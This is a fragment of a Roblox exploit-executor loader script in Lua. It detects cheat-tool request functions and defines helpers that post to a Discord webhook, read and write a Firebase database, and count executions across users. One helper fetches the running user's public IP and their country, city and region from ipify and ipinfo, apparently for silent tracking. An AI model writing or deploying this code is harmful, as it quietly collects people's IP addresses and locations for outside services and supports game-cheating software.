--[[ Find working request function ]]
local function getRequestFunction()
    if syn and syn.request then return syn.request end
    if request then return request end
    if http and http.request then return http.request end
    if http_request then return http_request end
    if fluxus and fluxus.request then return fluxus.request end
    return nil
end
local requestFunc = getRequestFunction()
local http = game:GetService("HttpService")

--[[ Functions ]]
local function notify(title, text)
    pcall(function()
        game.StarterGui:SetCore("SendNotification", {
            Title = title;
            Text = text;
            Duration = 5;
        })
    end)
end

local function sendToDiscord(message, embed)
    pcall(function()
        local payload
        if embed then
            payload = { embeds = { embed } }
        else
            payload = { content = message }
        end
        local json = http:JSONEncode(payload)

        if requestFunc then
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = json
            })
        else
            http:PostAsync(WEBHOOK_URL, json)
        end
    end)
end

--[[ FIREBASE CORE FUNCTIONS ]]
local function getFirebaseData(path)
    local url = string.format("%s/%s.json", FIREBASE_URL, path)
    local success, result = pcall(function()
        if requestFunc then
            local response = requestFunc({ Url = url, Method = "GET" })
            return response and response.Body
        else
            return http:GetAsync(url)
        end
    end)
    
    if not success or not result or result == "" or result == "null" then
        return {}
    end
    
    local success2, decoded = pcall(function()
        return http:JSONDecode(result)
    end)
    
    if not success2 or type(decoded) ~= "table" then
        return {}
    end
    
    return decoded
end

local function updateFirebaseData(path, data)
    local url = string.format("%s/%s.json", FIREBASE_URL, path)
    local json = http:JSONEncode(data)
    pcall(function()
        if requestFunc then
            requestFunc({ Url = url, Method = "PUT", Headers = { ["Content-Type"] = "application/json" }, Body = json })
        else
            http:PutAsync(url, json)
        end
    end)
end

--[[ Get User Location Data ]]
local function getUserLocation()
    local location = { ip = "Unknown", country = "Unknown", city = "Unknown", region = "Unknown" }
    pcall(function()
        local ip = game:HttpGet("https://api.ipify.org")
        if ip and ip ~= "" then
            location.ip = ip
            local ipInfo = game:HttpGet("https://ipinfo.io/" .. ip .. "/json")
            if ipInfo and ipInfo ~= "" then
                local data = http:JSONDecode(ipInfo)
                location.country = data.country or "Unknown"
                location.city = data.city or "Unknown"
                location.region = data.region or "Unknown"
            end
        end
    end)
    return location
end

--[[ Calculate Global Stats from All Users ]]
local function calculateGlobalStats(allUserData)
    local globalStats = {
        totalLoaderExecutions = 0,
        gameExecutions = {}
    }
    
    if type(allUserData) ~= "table" then
        return globalStats
    end
    
    for userId, userData in pairs(allUserData) do
        globalStats.totalLoaderExecutions = globalStats.totalLoaderExecutions + (userData.totalLoaderExecutions or 0)
        
        if type(userData.gameExecutions) == "table" then
            for gameId, count in pairs(userData.gameExecutions) do
                globalStats.gameExecutions[gameId] = (globalStats.gameExecutions[gameId] or 0) + count
            end
        end
    end
    
    return globalStats
end

